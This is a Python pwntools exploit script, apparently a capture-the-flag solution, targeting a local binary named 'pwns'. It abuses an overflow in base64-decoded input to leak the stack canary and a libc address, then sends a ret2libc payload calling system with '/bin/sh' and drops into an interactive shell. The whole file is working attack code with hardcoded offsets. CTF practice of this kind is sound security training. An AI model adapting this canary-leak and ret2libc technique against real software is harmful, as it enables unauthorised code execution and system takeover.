#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from base64 import b64encode as b64
import pdb
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    addr = raw_input("DEBUG: ")
    gdb.attach(io, "b *" + str(addr))

io = process("./pwns")

def sendData(payload, final = False):
    io.sendlineafter("[Y/N]\n", "Y")
    io.sendlineafter("datas:\n\n", b64(payload))
    #  pdb.set_trace()
    if final:
        return
    else:
        io.recvuntil("Result is:")
        data = io.recvuntil("May be I", drop = True)
        return data

def getCanary():
    len = 0x10d - 0xc + 1
    payload = cyclic(len)
    canary = sendData(payload)[258: 261]
    return u32("\x00" + canary)

def getLibc():
    len = 0x17c - 0x2b 
    payload = cyclic(len)
    leaked = sendData(payload)[337: 337 + 4]
    return u32(leaked) - 246 - 0x18180

if __name__ == "__main__":
    canary = getCanary()
    libc_base = getLibc()
    #  getshell_addr = libc_base + 0x5F7A6
    #  payload = cyclic(0x10d - 0xc) + p32(canary) + cyclic(0xc) + p32(getshell_addr)
    sh_addr = libc_base + 0x15cdc8
    sys_addr = libc_base + 0x0003ab30
    payload = cyclic(0x10d - 0xc) + p32(canary) + cyclic(0xc) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
    sendData(payload, True)
    #  debug()
    io.interactive()
    io.close()
